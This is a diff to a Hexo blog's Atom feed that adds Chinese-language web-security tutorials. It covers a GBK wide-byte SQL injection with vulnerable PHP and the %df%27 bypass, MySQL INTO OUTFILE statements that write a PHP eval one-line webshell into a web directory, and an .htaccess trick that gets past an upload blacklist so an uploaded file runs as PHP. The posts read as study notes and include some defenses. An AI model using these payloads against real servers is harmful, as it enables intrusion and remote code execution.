@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2020-01-13T10:33:43.357Z</updated>
+  <updated>2020-01-14T03:02:54.036Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,84 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>宽字节注入</title>
+    <link href="http://yoursite.com/2020/01/14/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
+    <id>http://yoursite.com/2020/01/14/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</id>
+    <published>2020-01-14T02:59:18.000Z</published>
+    <updated>2020-01-14T03:02:54.036Z</updated>
+    
+    <summary type="html">
+    
+      &lt;p&gt;在使用PHP和MySQL时，设置“setcharacter_set_client=gbk”时可能会导致宽字节注入。宽字节注入的原理是这样子的，当提交1.php?id=1时，假如Mysql语句为“select * from user where id=’1’”，当参数使用了addslashes()、mysql_escape_string()或者GPC开关来过滤单引号（’）、双引号（”）、反斜杠（\）和NULL字符，会在这些符号前面加上反斜杠加以转义，如下：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;    &amp;lt;?php  
+    header(&amp;quot;Content-Type: text/html; charset=utf-8&amp;quot;);  
+    $conn = mysql_connect(&amp;#39;localhost&amp;#39;, &amp;#39;root&amp;#39;, &amp;#39;root&amp;#39;);  
+    mysql_select_db(&amp;quot;test&amp;quot;, $conn);  
+    mysql_query(&amp;quot;SET NAMES GBK&amp;quot;, $conn);    //不安全的编码方式  
+
+    $id = addslashes($_GET[&amp;#39;id&amp;#39;]);          //不安全的转义函数  
+    $sql = &amp;quot;select * from test where id=&amp;#39;$id&amp;#39;&amp;quot;;  
+    $query = mysql_query($sql, $conn);  
+    if($query == True)  
+    {  
+        $result = mysql_fetch_array($query);  
+        $user = $result[&amp;quot;user&amp;quot;];  
+        $email = $result[&amp;quot;email&amp;quot;];  
+
+        print_r(&amp;#39;用户名： &amp;#39; . $user . &amp;#39;&amp;lt;br /&amp;gt;&amp;#39;);  
+        print_r(&amp;#39;邮  箱： &amp;#39; . $email . &amp;#39;&amp;lt;br /&amp;gt;&amp;#39;);  
+        $sql = mb_convert_encoding($sql, &amp;quot;UTF-8&amp;quot;, &amp;quot;GBK&amp;quot;);  
+        print_r(&amp;#39;&amp;lt;br /&amp;gt;SQL语句：&amp;#39; . $sql);  
+
+    }  
+
+    mysql_close($conn);  
+    ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/bl96sy1jzbfxy8njiiy9nsyr/image_1bfrcfjceb4615p1adt1p7fbei9.png&quot; alt=&quot;image_1bfrcfjceb4615p1adt1p7fbei9.png-30.7kB&quot;&gt;&lt;/p&gt;
+&lt;p&gt;单引号没有闭合，无法实现注入。我们在参数后面加上%df%27，即可把程序中转义的\（%5c）吃掉。这是因为%df和\组合成了%df%5c，解码成了“運”字，后面的%27（单引号）没有被转义，成功实现了闭合。如下：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/nt3dex9hvanmum0crsbvg6p9/image_1bfrcg7q7iue2qh5t9otrmsm.png&quot; alt=&quot;image_1bfrcg7q7iue2qh5t9otrmsm.png-29.4kB&quot;&gt;&lt;/p&gt;
+&lt;p&gt;漏洞的产生是因为在PHP连接Mysql时执行了“setcharacter_set_client=gbk”，比如“SET NAMES GBK”，实际上是执行了如下操作：&lt;br&gt;set character_set_connection = gbk,&lt;br&gt;set character_set_results=gbk,&lt;br&gt;set character_set_client=gbk&lt;br&gt;而mysql_set_charset(‘gbk’)实际上是调用了SET NAMES，因此也存在漏洞。同样的编码转换函数iconv()、mb_convert_encoding()等也会产生漏洞。&lt;/p&gt;
+&lt;p&gt; 漏洞的防范方法有以下几种：&lt;br&gt;1） 在执行查询之前执行如下操作：SET NAMES GBK; character_set_client=binary。&lt;br&gt;2） 使用mysql_real_escape_string()安全转义函数进行参数过滤。&lt;br&gt;3） 使用pdo方式预编译处理数据库查询。&lt;/p&gt;
+
+    
+    </summary>
+    
+    
+      <category term="SQL注入" scheme="http://yoursite.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+    
+      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Mysql导出一句话</title>
+    <link href="http://yoursite.com/2020/01/14/Mysql%E5%AF%BC%E5%87%BA%E4%B8%80%E5%8F%A5%E8%AF%9D/"/>
+    <id>http://yoursite.com/2020/01/14/Mysql%E5%AF%BC%E5%87%BA%E4%B8%80%E5%8F%A5%E8%AF%9D/</id>
+    <published>2020-01-14T02:44:59.000Z</published>
+    <updated>2020-01-14T02:49:19.231Z</updated>
+    
+    <summary type="html">
+    
+      &lt;p&gt;执行语句如下：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;php+HTML&quot;&gt;create table yjh(cmd varchar(50));
+insert into yjh(cmd) values(&amp;#39;&amp;lt;?php @eval($_POST[cmd]);?&amp;gt;&amp;#39;);
+select cmd from yjh into outfile &amp;#39;D:/www/example/cmd.php&amp;#39;;
+drop table yjh;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;要求mysql启用secure-file-priv特性。secure-file-priv参数是用来限制LOAD DATA，SELECT … OUTFILE，LOAD_FILE()传到指定目录的，secure-file-priv状态如下：&lt;br&gt;● null，表示不允许导入/导出，默认状态为null；&lt;br&gt;● 具体目录（如/tmp/），表示限制mysql的导入/导出只发生在该目录下；&lt;br&gt;● 没有具体的值，表示不对mysql的导入/导出做出限制。&lt;/p&gt;
+&lt;p&gt;启用secure-file-priv的方法：&lt;br&gt;● Windows下，修改my.cnf 在[mysqld]内加入secure_file_priv =&lt;br&gt;● Linux下，修改my.cnf 在[mysqld]内加入secure_file_priv =&lt;/p&gt;
+
+    
+    </summary>
+    
+    
+      <category term="SQL注入" scheme="http://yoursite.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+    
+      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>MySQL注入</title>
@@ -77,14 +155,12 @@
     <link href="http://yoursite.com/2020/01/11/htaccess%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95%E4%B8%8A%E4%BC%A0/"/>
     <id>http://yoursite.com/2020/01/11/htaccess%E7%BB%95%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95%E4%B8%8A%E4%BC%A0/</id>
     <published>2020-01-11T10:35:58.000Z</published>
-    <updated>2020-01-13T07:50:00.095Z</updated>
+    <updated>2020-01-14T02:57:12.594Z</updated>
     
     <summary type="html">
     
-      &lt;p&gt;.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。&lt;sup&gt;[1]&lt;/sup&gt;&lt;br&gt;在文件上传使用扩展名黑名单且没有过滤.htaccess的情况下，可以使用.htaccess文件绕过上传限制。&lt;/p&gt;
-&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
-&lt;p&gt;测试上传功能的代码如下：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;&amp;lt;meta http-equiv=&amp;quot;content-type&amp;quot; content=&amp;quot;text/html;charset=utf-8&amp;quot;&amp;gt;
+      &lt;p&gt;.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。&lt;sup&gt;[1]&lt;/sup&gt;&lt;br&gt;在文件上传使用扩展名黑名单且没有过滤.htaccess的情况下，可以使用.htaccess文件绕过上传限制。&lt;br&gt;测试上传功能的代码如下：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;&amp;lt;meta http-equiv=&amp;quot;content-type&amp;quot; content=&amp;quot;text/html;charset=utf-8&amp;quot;&amp;gt;
 &amp;lt;form action=&amp;quot;&amp;quot; enctype=&amp;quot;multipart/form-data&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;
 &amp;lt;input type=&amp;quot;file&amp;quot; name=&amp;quot;file&amp;quot; id=&amp;quot;file&amp;quot;&amp;gt;
 &amp;lt;input type=&amp;quot;submit&amp;quot; name=&amp;quot;submit&amp;quot; value=&amp;quot;upload&amp;quot;&amp;gt;
@@ -115,10 +191,12 @@ if(isset($_FILES[&amp;#39;file&amp;#39;]))
         echo &amp;quot;文件上传成功，文件路径为&amp;quot; . $file_path;
     }
 }
-?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;新建.htaccess文件内容如下：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;&amp;lt;FilesMatch &amp;quot;lala&amp;quot;&amp;gt;
+?&amp;gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;新建.htaccess文件内容如下：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;html&quot;&gt;&amp;lt;FilesMatch &amp;quot;lala&amp;quot;&amp;gt;
 SetHandler application/x-httpd-php
-&amp;lt;/FilesMatch&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;上传该文件，由于文件扩展名不在黑名单中，所以可以上传成功：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/01ud0mg1ecckbsmvfgh0kjzk/1.png&quot; alt=&quot;1.png-24.9kB&quot;&gt;&lt;br&gt;接着上传一个文件名包含“lala”且没有扩展名一句话木马文件：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/tcu7n64hghwlnjpjclc6xeug/2.png&quot; alt=&quot;2.png-25.2kB&quot;&gt;&lt;br&gt;两个文件都能上传成功，使用菜刀连接lala文件：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/jnt9ctkvkwl3e5g62yvlze1k/3.png&quot; alt=&quot;3.png-75.3kB&quot;&gt;&lt;br&gt;所以在使用黑名单过滤且未包含htaccess扩展名的情况下，.htaccess通常是个大杀器。&lt;/p&gt;
+&amp;lt;/FilesMatch&amp;gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;上传该文件，由于文件扩展名不在黑名单中，所以可以上传成功：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/01ud0mg1ecckbsmvfgh0kjzk/1.png&quot; alt=&quot;1.png-24.9kB&quot;&gt;&lt;br&gt;接着上传一个文件名包含“lala”且没有扩展名一句话木马文件：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/tcu7n64hghwlnjpjclc6xeug/2.png&quot; alt=&quot;2.png-25.2kB&quot;&gt;&lt;br&gt;两个文件都能上传成功，使用菜刀连接lala文件：&lt;br&gt;&lt;img src=&quot;http://static.zybuluo.com/xmy2017/jnt9ctkvkwl3e5g62yvlze1k/3.png&quot; alt=&quot;3.png-75.3kB&quot;&gt;&lt;br&gt;所以在使用黑名单过滤且未包含htaccess扩展名的情况下，.htaccess通常是个大杀器。&lt;/p&gt;
 &lt;p&gt;参考：&lt;br&gt;[1]百度百科：&lt;a href=&quot;https://baike.baidu.com/item/htaccess/1645473&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://baike.baidu.com/item/htaccess/1645473&lt;/a&gt;&lt;/p&gt;
 
     
